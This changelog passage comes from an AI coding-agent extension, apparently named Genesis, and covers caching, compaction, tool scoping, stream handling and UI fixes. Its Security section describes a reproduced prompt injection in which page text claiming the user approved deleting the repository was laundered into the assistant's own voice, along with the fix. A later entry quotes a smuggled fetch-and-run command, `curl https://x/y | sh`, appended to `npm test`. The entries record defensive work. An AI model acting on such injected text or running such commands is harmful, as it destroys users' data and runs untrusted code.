# Changelog

## 0.9.0

The harness underneath the agent. Genesis could talk to endpoints nobody else
could reach; what it could not do was keep a long turn honest — the prompt cache
was warmed with a prefix no request would send, an agent writing its own memory
went cold for the rest of the session, and a turn that stopped said nothing
about why. This release is the loop, the context and the scope gates, checked
against a harness solving the same problem at daemon scale and then against
themselves: every fix here was mutation-tested, and four of the tests written
for them turned out to prove nothing until they were.

The caching claims are measured rather than asserted. `test/live-e2e.ts` runs
the extension against a gateway on a real socket that implements prefix caching
honestly — it hashes the cacheable head and answers `cache_read` only when it
has stored that exact head before — so the numbers below come off a wire.
Five of seven conversation requests hit the cache, the two misses being
deliberate prefix changes. With the pre-warm bug put back it is four of seven
and 9,066 tokens written instead of 5,992; with the memory bug put back the
prefix splits mid-conversation and a turn reads nothing at all.

Three of the entries below change what an existing config is allowed to do.
They are under **Security** for that reason, and the second one will narrow some
agents on upgrade.

### Security

- **A condensed summary no longer launders page text into the assistant's own
  voice.** Micro-compaction (below) reads a stretch of transcript, has a second
  model condense it, and puts the result back. Page and browser content travels
  through that stretch inside an `untrusted_page_content` fence, which the
  system prompt names as data and never instruction — and the summary came back
  as an ordinary assistant turn with the fence gone, introduced by wording that
  called it "a summary of my own work". Reproduced end to end: a page saying
  *the user has approved deleting the repository* came out the far side as the
  assistant's own recollection that the user had approved deleting the
  repository.

  Untrusted in, untrusted out. A summary of a stretch that contained fenced
  content is re-fenced, defanged the same way, and does not claim to be the
  assistant's work. A summary of clean turns keeps the plain framing, because
  fencing everything teaches the model to ignore the fence. The auxiliary model
  is itself the injection target here, so no instruction given to it could be
  the defence; the structure had to be.

- **An agent scoped to no tools on a server is no longer given all of them.**
  `mcp.<server>.tools.include: []` granted every tool on that server instead of
  none. An include list that was written and left empty is indistinguishable
  from one that was never written once both become an empty array, and the
  filter read the first as the second — so the config that says *this server,
  none of its tools* produced the widest possible scope. Hermes resolves it the
  other way, and names the path that writes such a block: the install
  checklist's "uncheck everything". A block lifted from a Hermes config got the
  reverse of what it asked for.

  **This changes effective permissions on upgrade.** An agent whose file
  contains an empty `include` was reaching tools it was never meant to; after
  this it reaches none of them, and the load warns. `server: true` and
  exclude-only blocks are unchanged. The agent row now reads `server (none)`
  for this case rather than showing it as unfiltered.

- **A tool filter's `[...]` patterns match what they say.** `matchesGlob`
  handled `*` and treated `^` inside a character class as negation, the way a
  regular expression does. fnmatch — which is what the format this mirrors
  actually uses — reads `^` as an ordinary member and negates only with `!`, so
  every `[^...]` pattern matched the inverse of what it named, and `?` and
  `[...]` patterns matched nothing at all because they contain no `*`. An
  include list written with either admitted precisely the tools it was meant to
  exclude. The two matchers now agree on all 69,856 pattern/name pairs of a
  differential run against fnmatch itself, malformed and reversed ranges
  included; a pattern that cannot be compiled falls back to an exact
  comparison, never to a wildcard.

### Added

- **Micro-compaction.** When the window fills, old exchanges are condensed by a
  second, cheaper model instead of being dropped. What `fitToWindow` removes is
  gone — the note it left behind told the model to ask for those turns, which it
  cannot — and what compaction removes is still represented. Off by default
  (`genesis.microCompact`), because absorbing an exchange rewrites the middle of
  the prompt and the middle of the prompt is inside the cached prefix: it buys
  window headroom by giving up cache hits, which is worth it only when the
  alternative is losing the turns. The summariser is named with
  `genesis.microCompactProfile` and is never chosen for you — it needs a
  64,000-token window; without one it says so once in the log and the old
  trimming carries on unchanged.

  Exchange boundaries are what make it safe: an exchange opens at an assistant
  turn and is closed by the next user turn, so *no user turn is ever compacted*
  is a property of the data structure rather than a rule to remember, and a tool
  result can only ever sit with the call that produced it. It runs once per
  turn, never per model call — running it per call rewrote the cacheable prefix
  seven times inside a single twelve-call turn.

- **A turn now says why it stopped.** `maxIterations` was the only guard and
  every other ending was a bare return, so an abort, an exhausted budget and a
  run of failing tools all looked identical from outside: the model was talking,
  and then it was not. There is now a token budget beside the step count — steps
  were never a proxy for cost, and twenty-five against a 200k window is a
  different bill from twenty-five short ones — one grace call with no tools when
  it runs out, so the work already done gets reported instead of cut off, and a
  ceiling of eight consecutive steps that achieve nothing. Every ending carries
  a reason.

- **A server vouched for as read-only is checked against its own tools.**
  `readOnly: true` opens a server to Ask and Plan and nothing verifies it, which
  is right — the alternative is trusting a server's account of itself. But MCP
  tools do carry `annotations.readOnlyHint`, and comparing the two claims
  catches the one honest way the promise breaks: a server marked read-only by
  mistake. When a vouched-for server exposes tools that do not declare
  themselves read-only, the load says so and names them. The hint never opens a
  gate — a server that means harm sets it.

### Changed

- **An agent's memory is a snapshot taken once per session.** It was re-read at
  the top of every turn, so an agent writing to its own memory changed the
  system prefix underneath itself and paid cold-cache prices for every remaining
  turn — the better the feature worked, the more it cost. The write still lands
  on disk immediately; it reaches the prompt in the next session.

- **A memory write that will not fit is refused instead of silently truncated.**
  `MAX_MEMORY_CHARS` was enforced on the read, with a warning going to a log the
  model never sees, so the tail vanished and the agent never learned that memory
  is a budget to curate. A write past the cap now comes back naming the cap and
  the size, and asking for consolidation. A write that leaves the file no larger
  than it already is always goes through, so a file that grew past the cap by
  some other route stays fixable. **Agents that wrote freely past 8,000
  characters will start being refused.**

- **`tools: []` warns.** An empty built-in allowlist means *every* built-in, not
  none, which is how it has always worked and how it reads backwards. The
  behaviour stays — an agent that cannot read a file is a slip, not an intent —
  and the load now says what it means.

- **The packaged artifact is activated and painted before it ships.**
  `npm run package` unpacked the vsix and confirmed the entry point exported
  `activate` — with `vscode` bound to an empty object, so calling it would have
  thrown on the first API it touched. The one thing every user does first was
  never done to the file they install. It is now called, on a cold workspace,
  and checked for what it leaves behind: all twenty commands the manifest
  declares are registered at runtime, the editor providers are registered,
  disposables reach the context, nothing is surfaced as an error, and it shuts
  down without throwing.

  The panel is rendered too, in real Chromium rather than jsdom, from the same
  html the extension serves with the same Content-Security-Policy — in both a
  dark and a light workbench, since `body` is transparent on purpose and only a
  light one makes the sheet paint its own ground. jsdom computes no boxes, so
  it cannot see a stylesheet the engine rejects, a grid that collapses, a font
  that never arrives, or a script that throws only in V8. Nothing overflows at
  320px, both bundled faces load, and every measured label holds 4.5:1 as
  composited — 6.34:1 at worst.

- **Micro-compaction will not choose an endpoint for you.** It used to pick the
  summariser automatically — the first profile that was `kind: chat`, was not the
  active one, and had a large enough window. Switching the feature on therefore
  sent parts of the conversation, including file contents and command output the
  agent had read, to an endpoint configured for something else entirely. That is
  survivable for one person watching a log line and is not survivable across a
  team, where it only takes one workspace with a cloud profile sitting beside a
  local one.

  `genesis.microCompactProfile` now names the summariser and there is no
  fallback: unset, unknown, or too small a window all mean compaction does not
  run, the log says which, and the loop trims as it always did. The line that
  reports it being on now also says what will be sent there.

- **The prompt-cache counters are reported.** The client decoded
  `cache_read_input_tokens` and `cache_creation_input_tokens` and then dropped
  them, so for a build whose headline is that prompt caching now works there was
  no way to see whether it did. A read of zero, turn after turn inside one
  conversation, means something in the stable head of the prompt is moving — the
  exact shape of the two bugs below. It is now one line per turn in the log,
  and it says so when the read is zero.

### Fixed

- **Six ways a stream could end wrong, all of them silent.** Reproduced in
  `test/stream-boundary.ts`, which is the file that did not exist. A gateway
  that sent a tool call and then simply stopped, with no `finish_reason`, had
  that call discarded in the decoder's map: the model had asked to read a file
  and the user got a blank bubble. A final frame terminated by one newline
  instead of two was left in the buffer and thrown away, taking the last tokens
  of the reply or the terminal frame with it. An error delivered inside a 200 —
  which is how every OpenAI-compatible gateway reports a mid-generation failure
  — fell through every branch, so a partial answer looked complete.
  `finish_reason: "length"` was read only as a cue to flush tool calls, so a
  reply cut off at `maxOutputTokens` ended mid-word looking finished; with the
  default of 4096 that is the most common way a turn ends badly. And
  `finish_reason` arriving on the last *content* frame drained before that
  frame's own argument chunk was read, truncating the call, while a terminal
  frame carrying no `delta` key at all was skipped entirely.

  Decoders now expose `push`/`flush`, the flush runs at end of stream, the
  trailing frame is parsed through the same path, and the two stop reasons that
  mean the answer is incomplete are said out loud with the remedy.

- **The panel was shown the model's thinking.** From the second visible frame
  onward the loop yielded the raw chunk instead of the filtered one, so a
  `<think>` block that opened after the first word rendered verbatim into the
  answer while the saved transcript correctly omitted it. At small frame sizes
  it left tag fragments — `<ink>` — spliced into the prose instead. Which of the
  two you got depended on where the gateway split its frames, so it was
  non-deterministic and could not be reproduced from the session file.

- **The context meter under-reported the whole conversation on the Anthropic
  wire.** Input tokens arrive once on `message_start` and output on
  `message_delta`, and the delta yielded `input: 0`. The loop takes the newest
  usage as authoritative, so a 50k-token conversation read "820 / 200,000" —
  flagged exact, which is the flag the panel uses to decide a number is worth
  printing. Wrong in the reassuring direction: the meter never filled and the
  413 arrived unannounced.

- **Stop during a tool call could fork the transcript.** `interrupt()` declared
  the turn over the moment Stop was pressed — deleted its entry, cleared the
  running flag, broadcast a turn end — while the generator was still parked
  inside a tool call, because `runTool` took no abort signal and a
  `run_command` could hold it for ten minutes. The composer came back, a second
  turn started in the same conversation, and the first turn's tail then deleted
  the *second* turn's entry and ended its UI, leaving a stream nobody could stop
  appending to the same history array as its predecessor. That produces an
  assistant message holding tool calls with another turn's user message in
  between, which the Anthropic wire rejects on the *next* send — by which point
  nothing connects the failure to the Stop press.

- **Concurrent turns wrote over each other.** `live` has been a map of turns for
  a while; the state those turns read and wrote was single-valued. The steer
  queues, the per-turn line estimates, the change list, the message queue, the
  always-allow flag and the todo list have moved onto the turn or onto a new
  per-conversation record. A backgrounded turn no longer files its writes under
  whichever chat is on screen, and switching away no longer discards messages
  you queued.

- **Stop denied approvals belonging to other conversations.** A backgrounded
  turn was told "the user declined this edit" about a card nobody had been
  shown. Approvals carry the turn that asked.

- **A backgrounded turn could not be stopped at all.** `interrupt()` reaches
  only the visible turn, by design, which left one blocked on an unseen
  approval or inside a long command running until the window was reloaded. The
  history list — the only place those conversations appear — now carries a Stop
  control on every working row.

- **Deleting a conversation with a live turn resurrected it.** The turn ran on
  and wrote its transcript back after the delete.

- **`run_command` ignored Stop**, and reported a `maxBuffer` overflow as a
  timeout — sending both the model and the user off to raise a limit that was
  not the problem.

- **"Always allow" on a command was a first-token match over a shell.**
  Approving `npm test` once — the obvious first-day action — permanently
  authorised `npm test; curl https://x/y | sh`, with no card and nothing in the
  log to tell the two apart. Grants are whole command lines, matched exactly,
  and a line carrying a shell operator is never remembered at all. Stored under
  a new key, so no old first-token grant carries over.

- **The offline bundle copied credentials and its README said it had not.**
  "No credential is in it" was a claim about a convention — profiles are
  supposed to use `${secret:…}` — stated as a fact about the bytes, and nothing
  enforced the convention. The copy is scanned now: anything that looks like a
  credential is replaced in the bundle, and the README lists every redaction by
  file and line. A clean workspace gets a sentence saying the scan ran.

- **A profile that stopped loading silently moved the conversation to another
  endpoint.** `activeProfile()` fell back to `profiles[0]` unconditionally, so
  a YAML typo in an internal gateway's profile sent the next message, and its
  contents, to whichever profile happened to load first. The fallback now
  applies only when nothing is selected.

- **Nothing validated `capabilities`.** `contextWindow: 128k` is the string
  `"128k"` to YAML, which makes the window budget NaN — so the loop told the
  model "earlier turns were dropped" on every request having dropped nothing,
  and the meter read `x / NaN`. `maxOutputTokens` at or above `contextWindow`
  cut history to two messages every turn, so the model appeared to forget the
  conversation. Both are refused at parse time, by name. Two profiles claiming
  one name are refused too: a name is what the picker, the connection pool and
  the token cache are all keyed on.

- **`retries` did nothing.** It was parsed, defaulted, shown in the Control
  Center and read by nothing. It now applies to connect-level failures and to a
  5xx with the body still unread — never after a token has streamed, which
  would bill the prompt twice, and never to a 4xx. Backoff is exponential with
  jitter.

- **With no folder open, the composer said "Configure an endpoint first".**
  That names the fix for the other blocking condition. There is nothing to
  configure: profiles come from the folder you have open, and there is none.
  The two cases have separate messages, and the welcome screen has an Open
  folder button rather than a sentence with nothing to press.

- **Path containment compared case-sensitively on Windows**, where
  `C:\Work\Proj` and `c:\work\proj\file.ts` are the same location. A file the
  user was looking at could be judged outside the workspace.

### Changed

- **Genesis declares that it does not support untrusted workspaces.** An
  endpoint profile can name a transform module — arbitrary JavaScript, run
  before the first request — or an `exec` credential helper, and `.agent/mcp.json`
  names programs to launch. That is the real boundary around all of it, and the
  manifest had left it to a default. The composer also stopped pre-warming on
  focus: warming builds the client, which runs those programs, and clicking
  into a text box is not a request to.

- **`node:vm` is documented as what it is.** The comment beside the transform
  loader's narrowed `require` read as a claim that a transform could not reach
  the filesystem or the network. It can; `vm` is an isolation primitive, not a
  security boundary.

- **MCP servers are killed as a process tree and given an environment
  allowlist.** The canonical command is a launcher that spawns the real server,
  so killing the direct child orphaned it — every window reload could leave
  another behind. And a server named by a file in the open workspace was handed
  every variable the user's shell exported.

- **`search` refuses a pattern shaped like catastrophic backtracking**, and has
  a wall-clock budget for everything merely slow. A model-authored
  `(\s*\w+)+$` froze the extension host, taking every other extension in the
  window with it — and taking Stop with it, because Stop is a message a frozen
  host cannot process.

- **The webview CSP nonce comes from `crypto`** rather than `Math.random()`. It
  is the entire `script-src`.

- **The two halves compare builds.** A webview VS Code served from its cache
  after an update produced a control that did nothing, with no error and no log
  line. Both sides also log a message they do not recognise instead of dropping
  it.

- **The test runner discovers suites instead of being told about them.**
  `npm test` was a 3,000-character string naming fifty files by hand and
  `test:bundle` was a second copy of it. `mentions.cjs` — 99 assertions over the
  `@`-mention path — was referenced by no script at all, so the fix it covers
  shipped with a test that had never executed. `npm run verify` now runs
  everything that does not need a live endpoint, including the suites that read
  the packaged `.vsix`.

### Fixed (earlier in this cycle)

- **The cache pre-warm warms the prefix the request will actually send.**
  `systemPromptFor` takes five arguments and says in its own comment that the
  pre-warm and the real request have to build the same string. The pre-warm
  passed four, and the missing one is the second element of the joined array, so
  every character after it diverged: every warmed entry on a profile that names
  a model was a prefix nothing would ever ask for.
- **The controls whose border IS the control now have a visible one.** Measured
  on the shipped panel, the composer's outline sat at **1.47:1** against the
  ground and every outlined button — send, attach, mode, the phase segment, and
  the `.btn` family — at **2.03:1**. WCAG 1.4.11 asks 3:1 of the visual
  information required to identify a component, and for a button with a
  transparent fill the border is all there is.

  `--kx-edge` is a new token for exactly that job, at 3.14:1 on the panel and
  3.07:1 on the composer's own floor. **Dividers keep `--kx-line` at 2.04:1 on
  purpose** — a rule that climbed to 3:1 would turn a list of rows into a grid
  of boxes, which is a redesign of the panel's rhythm to solve a problem the
  buttons had. Nothing else moved: the row hairlines, the status pills, the
  count badges and the tip strip were all measured and left alone, because the
  text in them is what carries their meaning and it already passes.

  The edge is checked on **two grounds**, because the panel paints neither: it
  sets no background at all and takes the workbench container's colour, so
  `--kx-bg` is the ground the palette is designed against rather than one it is
  guaranteed to sit on. The direction surprises — a white wash gets *darker* in
  absolute terms as the ground beneath it darkens, and at the black end the
  contrast formula's flare term dominates, so the ratio falls. The first
  revision of this fix measured 3.12:1 on Dark Modern's `#181818` and **2.94 on
  the near-black `#010409`** an owner's workbench actually samples: passing the
  suite while failing where it counts. It is 3.59 and 3.42 now, and
  `contrast.cjs` measures both.

  `tokens.css` had claimed in a comment that its alphas "keep the 3:1 boundary
  contrast the suite enforces". Both halves were untrue — 2.03 is not 3, and
  `test/contrast.cjs` had never read a line token at all, which is how every
  check in that file passed while the composer had no visible edge. It reads
  both tokens now, and asserts them in opposite directions.

- **The mode sheet said it was modal and was not.** It renders as
  `role="dialog" aria-modal="true"`, which promises the rest of the panel is
  unreachable while it is up. Measured, it kept none of that: focus never
  entered it, 8 of 12 Tab presses left it, and Escape did nothing at all.

  The first two Tabs landed on **attach and send, behind the scrim** — and
  Enter there posted the message. So a keyboard user sent a draft they never
  meant to send, from behind a dialog they could not dismiss. The scrim stopped
  a mouse and stopped nothing else.

  Now: opening it puts focus on the mode currently in force, Tab and Shift+Tab
  wrap inside the card, Escape closes it, and focus returns to the button that
  opened it. The key handler is on `document` in the capture phase — once focus
  has escaped, a listener on the sheet never sees the keystroke, which was the
  whole failure — and it stops what it handles, so Escape closes the sheet
  rather than also interrupting a running turn. The sheet is marked `inert` for
  its 380 ms exit, where it stays visible and focusable.

- **The Control Center printed `undefined` at the user.** The Request-shape card
  showed `Timeout: undefined ms` and `Retries: undefined` for any profile that
  omits them — the ordinary case, since both are optional. The four rows around
  them guard correctly and show `-`; these two did not.

  The suite already asserted "prints no undefined" across every section, and
  still missed it, for a reason worth recording: `textContent` runs a row's
  label straight into its value, so an unguarded field reads as
  `Timeoutundefined ms` — and `\bundefined\b` needs a non-word character before
  the `u`, which there is not. The word-bounded pattern silently passed the one
  shape this table actually produces. It is now bare, which also closes the same
  hole for every other section.

### Changed
- **Every menu in the panel now arrives instead of appearing.** The mode sheet
  was the only one that moved - it rides up from the bottom edge on an expo-out
  curve with a scrim and a staggered row entrance. The model picker, the `/`
  and `@` pickers and both header menus flipped from hidden to visible on a
  single frame. Those are the ones opened constantly, so the polish had landed
  on the least-used surface.

  They now rise (or, for the header menus, drop) 6px into place and fade in
  over 130ms, on the same curve as the sheet - one family at two speeds. 130
  rather than the sheet's 340 because these open mid-keystroke: `/` fires on a
  single character, and anything long enough to admire is long enough to feel
  like lag.

  **No exit, deliberately.** An entrance that is eased reads as considered; a
  dismissal that is eased reads as slow. Escape should return the panel at
  once, because the thing you wanted is behind the menu.

  With motion reduced they fade without travelling. That setting asks not to be
  moved, not to be shown nothing, and a menu that materialises with no change
  at all is the abruptness this removes.

- **The welcome mark now arrives spinning and settles into its turn.** Two fast
  turns in a second, decelerating hard, handing off to the steady 6s rotation
  it had before. The steady turn is unchanged; what is new is the second in
  front of it.

  Two numbers make the handoff invisible, and neither is a guess. The entrance
  ends on **720deg** - a whole number of turns - so it renders identically to
  the 0deg the steady turn starts at; any other angle would jump. And its
  easing is shaped so the final velocity lands near **60deg/s**, which is what
  the steady turn runs at, so the deceleration runs out exactly as the constant
  rate takes over instead of stopping dead and starting again.

  Two turns rather than three, and the ceiling is the mark's own geometry: the
  bezel repeats every 90deg, so its apparent direction reverses once a frame
  advances it more than 45. At 60Hz that is about six turns a second. Three
  turns in 900ms peaked at nearly seventeen and the first sixth of a second was
  not a fast spin but a strobe. This peaks at 5.8, just under the ceiling - the
  fastest the mark can actually be seen to move forwards. It still reads as
  very fast, because what sells that is the ratio to what follows, and the
  steady turn is a sixth of a revolution per second.

  Only a deliberate arrival spins. A session list landing under the panel
  re-renders the welcome screen, and would otherwise throw the logo across it
  while you are reading.

### Fixed
- **A button on the MCP tab was unreachable at a narrow dock.** "Edit config"
  ran past the panel edge at 280px and was clipped by the server list's own
  scroller - half a button, no scrollbar to say the rest existed. The header
  row wraps now, and its two actions wrap as a group, so they arrive on a
  second line together rather than one of them leaving.

  Two more on the same tab, both invisible to a width measurement because
  neither costs any width. A server's tool count was painted **on top of** its
  read-only pill, text over a control; the name line wraps instead. And
  "Servers · 4 configured" broke between the dot and the word, which reads as
  two facts rather than one caption.

- **The composer's send and attach buttons were stranded on their own row at
  280px**, hugged to the right with the whole left half of the composer empty.
  They were made a group so a wrap would not orphan send by itself; it stopped
  send being orphaned alone and left the pair orphaned together. Below 350px
  the **model button** takes the second row instead - and gets better for it,
  since the whole model id fits there.

- **The model name was truncated before its first distinguishing character.**
  At 360px, the most ordinary sidebar width there is, the button rendered
  `claud…`. Every model this extension talks to begins that way, so the visible
  text told two models apart not at all. The phase segment gives up its side
  padding below 400px rather than below 330px, and a **green** endpoint dot -
  which is the absence of news - stands aside at those widths. The red one
  never does: a failing gateway is the entire reason the dot is there. Together
  that is `claude-sonnet…` where it was five characters and an ellipsis.

- **The active-agent bar's stop control sat six pixels proud** of "New agent"
  and every "Open" directly beneath it. Three right-aligned controls in one
  column, one out of line.

### Changed
- **`--kx-mcp` is now `--kx-agent`.** The name was a trap: the design gives MCP
  green and gives purple to agents, and a connected server was once painted
  purple on the strength of the old name alone. Not one of the token's call
  sites is an MCP server - it is the agent chip, the active-agent row,
  `.btn.primary`, the reasoning kind, accept-edits mode and a syntax colour.
  Purely a rename; the contrast suite pins the values and is unchanged in what
  it asserts.

### Added
- **An MCP server can now hand the model a picture.** An image content block in
  a tool result reaches the request body as an image, instead of being
  flattened to the six-character string `[image: image/png]`.

  The reason this mattered is not that a feature was missing. It is that the
  failure was silent: a read-only Confluence or Jira server could return the
  diagram attached to a page, the model would receive the words "image, png",
  and it would then answer about a document it had never seen. Nothing in the
  transcript said a picture had been dropped.

  The pipe already existed - it was built for browser screenshots, and only the
  browser used it. Now every server shares it, with the bounds that a tool
  result carrying pixels needs: png, jpeg, gif and webp only, since those are
  what the model wires accept inline; caps by image count, per image and per
  result; and a `data:` prefix stripped rather than forwarded, because a server
  built by pasting a browser data URI in otherwise produces a 400 that names
  neither the server nor the tool.

  Every refusal is stated in the text where the picture would have been, and
  numbered markers hold each image's place, so a result that is a caption, a
  diagram, a second caption and a second diagram does not arrive as two
  captions and two loose pictures.

  **This needs an endpoint that declares vision** - `capabilities.vision: true`,
  or `kind: multimodal`, which implies it. Without it the pixels are withheld
  on purpose: a gateway that cannot take an image answers an image block with a
  400 for the whole turn, which is worse than the description it replaced. The
  model still gets the description, plus one line naming the field that would
  have shown it the picture - so the next thing you read tells you what to
  change, rather than leaving you to notice that the answer was invented.
- **The Jira and Confluence MCP servers can fetch attachments.**
  `confluence_get_attachment`, `confluence_list_attachments`,
  `jira_get_attachment` and `jira_list_attachments`, in `mcp-servers/`. A
  Confluence page body reaches the model as `[image: topology.png]`; these turn
  that name into the picture. The page body now also says so once, naming the
  tool, because a marker a model cannot act on reads exactly like a marker
  there is nothing behind.

  The download follows the location the instance itself named - Confluence's
  `_links.download`, Jira's `content` - rather than a path built from a
  template. That is what survives a context path, a reverse proxy and a version
  that moved the route, and it matters more than usual here: this build
  environment cannot reach `developer.atlassian.com`, so a hardcoded download
  path would have been a guess dressed as a constant.

  A redirect is followed only within the configured instance. The credential is
  a client-wide header, so following a `Location` off-host would present the
  token to whatever host answered - and nothing about a 302 is authenticated.
  An attachment over ~3.75 MB is refused rather than truncated: half a file is
  a decode error, not a picture.

- **A read-only MCP server can now be used in Ask and Plan.** Mark it
  `"readOnly": true` in `.agent/mcp.json` and its tools are offered in the two
  modes that previously withheld MCP entirely.

  The old blanket rule was defensible - MCP has no way for a server to declare
  a tool read-only, so there was nothing to check - but it produced a bad
  outcome: a server that genuinely only reads was locked out of Ask, the
  read-only mode, and you had to enter Act, the mode that can also edit files,
  to run a search. The safest servers were excluded from the safest mode.

  What was missing is not something the protocol can supply. It is a statement
  by the person who configured the server, so now they can make it. **It is a
  claim, not a proof**: nothing inspects what the server does, exactly as
  nothing checks that `approval: "auto"` was wise. The MCP tab shows a
  `READ-ONLY` chip on a marked server whose tooltip says you declared it and
  the extension did not verify it - a claim nobody can see is a claim nobody
  can audit.

  Unmarked servers are entirely unaffected: still withheld in Ask and Plan,
  still refused at the call if the model names one anyway. Only a literal
  `true` counts - `readOnly: "true"` is warned about and treated as false,
  because widening what those modes may reach on the strength of a typo is
  exactly the failure this flag must not have.
- **The panel now ships the fonts it is drawn in.** IBM Plex Sans for the
  interface, Space Mono for every mono run in it, and Michroma for the GENESIS
  wordmark - the three families the Genesis design specifies. None of them were
  previously rendering. `--kx-mono` had *named* Space Mono for several releases
  without bundling a binary, and the webview CSP is `default-src 'none'` with
  `font-src` scoped to the extension, so a named-but-absent family cannot be
  fetched: every mono run in the panel - tab labels, model ids, timings, code -
  was silently the platform monospace. Naming a font is not shipping one, and
  nothing reported the difference.

  This also settles a licensing question that was blocking release. The seven
  Anthropic Sans faces bundled before are proprietary, and
  `media/fonts/LICENSE-NOTE.md` recorded their redistribution as *unresolved*,
  prescribing either written permission or a fall back to a licensed face. All
  three families the design specifies are SIL Open Font License, so matching
  the design and clearing the blocker turned out to be one change. The
  Anthropic Sans binaries are removed; `git log` retains them. 94 KB ships in
  their place, down from 236 KB.

  Michroma is on its own `--kx-brand` token rather than `--kx-display`. It has
  one weight and is drawn to be set once under heavy tracking; pointing the
  display token at it would have set every markdown heading in the transcript
  in a display face at a weight it does not have.
- **The welcome screen is the one the design draws.** It was a centred crystal
  over "How can I help?" - which is what every assistant says - and up to three
  resume chips. It now opens with the mark and the GENESIS wordmark, then two
  lists: **Try**, three openers, and **Recent**, the conversations already in
  progress with an All that opens the full history.

  The openers are the part worth being careful about. Invented suggestions were
  removed from this screen once before, correctly, for naming code no workspace
  has. These name none: each is a command the extension already has, aimed at
  what the user has open right now - explain the open file, review the
  uncommitted changes, write tests for the selection.

  The whole column is left-aligned, as the design has it. Everything below the
  intro is a list of rows, and a centred mark above a left-aligned list gives
  the column two different axes.
- **Every endpoint declares what kind of model it serves.** `kind:` is
  mandatory on new profiles - one of `chat`, `reasoning`, `multimodal`,
  `coding`, `completion` - and the Add-endpoint form refuses to save without
  it. A gateway cannot be asked this: `model:` is an opaque id and `baseUrl` is
  a hostname, so the extension was assuming "chat" and hoping, which is how a
  fill-in-the-middle base model ends up being offered tools it has no grammar
  for and fails on its first turn.

  The field is load-bearing rather than a label. It seeds the capability block:
  `multimodal` turns `vision` on, `reasoning` raises the output budget to 8192
  because thinking spends tokens before the answer does, and `completion` turns
  `tools` off and `fim` on. Seeding never overrides - a hand-written
  `vision: false` on a multimodal profile still wins - so `kind` is the
  headline and `capabilities:` stays the detail.

  A profile written before the field existed loads as `chat` rather than
  failing; a *misspelled* one is refused, because that is the case where
  silently seeding the wrong capabilities leaves nothing to point at months
  later.
- **The model picker says which kind each endpoint serves.** The rows were a
  tick and a model id, which told you nothing about what you were choosing
  between. They now carry the Genesis listbox shape - a selection dot, the
  model id over a sentence describing the kind, and a hue-coded tag - so eight
  profiles can be told apart at a glance. Colour follows the same argument the
  MCP tool chips make: the slot holds a classification, and telling them apart
  is the point. The Endpoints list in Diagnostics carries the same tag, so the
  answer is visible where endpoints are managed as well as where they are
  chosen - a profile that failed to parse shows none, having no honest one to
  report.

  The picker groups **by kind**, not by endpoint. Endpoint was the obvious
  grouping and the wrong one: with one model per profile it put a header above
  every single row, so the list was twice as tall as it needed to be and every
  header restated the name the row below already carried. What a user is
  choosing between here is capability - the one that thinks, the one that sees -
  so that is what the headers say, hue-coded, in a fixed order that does not
  depend on which order the profiles happened to load in. The endpoint moves
  onto the row, where it answers "which of these serves it", and the context
  window takes the right-hand slot the design puts a figure in.
- **Agents have a tab.** They were a collapsed section inside Diagnostics,
  which is where a thing goes to be inspected rather than used, three clicks
  from the composer and behind a heading nobody opens twice. The tab sits after
  MCP, because that is the order the two are chosen in: a server has to be
  configured before an agent can be scoped to it. It carries the list, the
  scope each agent enforces, the file each came from, and a New agent button in
  a sticky header so the one always-available action does not depend on there
  being anything in the list.
- **A count on the Agents tab**, following the rule MCP and Diagnostics already
  use: warnings, not totals. How many agents exist is not news and is on the
  tab's own page; a file that failed to parse is something the user has to be
  told about while looking somewhere else.

### Changed
- **The mode picker is a sheet, and it no longer offers Plan.** Plan is a
  *phase*, and it already exists as the middle segment of the ASK/PLAN/ACT
  control two inches to the left; offering it here too put one setting behind
  two controls that could disagree. What is left - Manual, Accept edits, Auto -
  maps one-to-one onto the three approval modes the host has always had.

  The picker itself is now the Genesis sheet: the panel dims, it rises from the
  bottom edge, and each mode states what it means in a sentence with a filled
  radio rather than a tick. Its metrics are sized to the panel rather than to a
  phone - the card is `height: auto` so it is exactly as tall as its three
  rows, capped at `min(72%, 300px)` so it yields on a short panel, and its
  gutters and type step down through `clamp()` as the panel narrows. Dropping
  Plan is what makes that compact size honest: three rows fit without scrolling
  at any panel height worth using.
- **Exactly one row in the model picker claims to be the selection.** The dot
  was bound to `data-active`, which is the *keyboard cursor* and moves with the
  arrow keys - so Auto and the endpoint it had resolved to both lit up, which
  reads as two selections. Selection is now its own state, and when Auto is in
  force its row names the endpoint it resolved to rather than restating the
  rule.
- **The send control is a rounded square.** A disc reads as a media button, the
  thing a consumer app puts under a video, and every other control in the
  composer is a rectangle with soft corners, so it was the one shape belonging
  to a different product. At a third of its own width it stays in the same
  family as the phase segments and the pills while remaining the heaviest
  element in the row, which is what a primary action should be. Armed it is the
  only filled control there, so the eye lands on it without anything else
  having to get louder; stop goes quiet rather than red, because red would say
  "something failed" at the moment nothing has. A press scales it, and reduced
  motion turns that off.
- **The composer has room to breathe.** A slightly larger corner radius, and
  padding in the text area and the toolbar that stops the first line sitting on
  the border. Nothing moved, nothing was added: the same controls, spaced like
  they were meant to be read.
- Agents are no longer listed in Diagnostics. One home, not two.

## 0.8.0

The editor surface. Genesis had one place to work, a panel, and everything
it could do had to be asked for there. This release is the other half: the
model reaches the file you are looking at, the cursor you are at, and the
errors already on screen, and it answers in the editor rather than beside it.

This merges a line of work that had been running in parallel since 0.5.4 and
had never reached main.

### Added
- **Ghost-text completion.** Suggestions at the cursor, behind two gates that
  both default off: `capabilities.fim` on the profile and
  `genesis.inlineCompletion` in settings. Either one off and not a single
  request is sent. Fill-in-the-middle needs a fast endpoint and most corporate
  gateways are not one, so this asks twice before it costs anything.
- **Quick edit.** Select code, say what to change, apply or discard the diff
  without leaving the file.
- **CodeLens, code actions and doc comments.** Explain, Document and Tests above
  functions and classes; fixes and rewrites in the lightbulb menu. Both on by
  default, both with a setting, because a lens on every function is the feature
  or the annoyance depending on the file. All three sit on one shared path for
  invoking the model outside a chat turn and applying an edit, so they are thin.
- **Commit message generation.** Writes into the Source Control box through the
  Git extension's API rather than by shelling out, so it knows which repository
  is in front of the user and can reach the box at all.
- **Ambient editor context.** The focused file, the cursor, other editors in a
  split, the open tabs and the compiler's diagnostics for that file ride with
  each message. It is what makes "fix this" resolve to anything. Capped at 10
  tabs, 12 problems and 200 characters each, about 160 tokens on a busy editor,
  and it rides in the user message rather than the system prompt because that
  prompt is a cache key and this text changes whenever the cursor moves.
  `genesis.editorContext` turns it off.
- **A project instructions file.** `.agent/instructions.md`, prepended to every
  system prompt, for conventions that hold on every turn. Skills are the
  on-demand half of the same idea. Capped, with truncation stated in-band so a
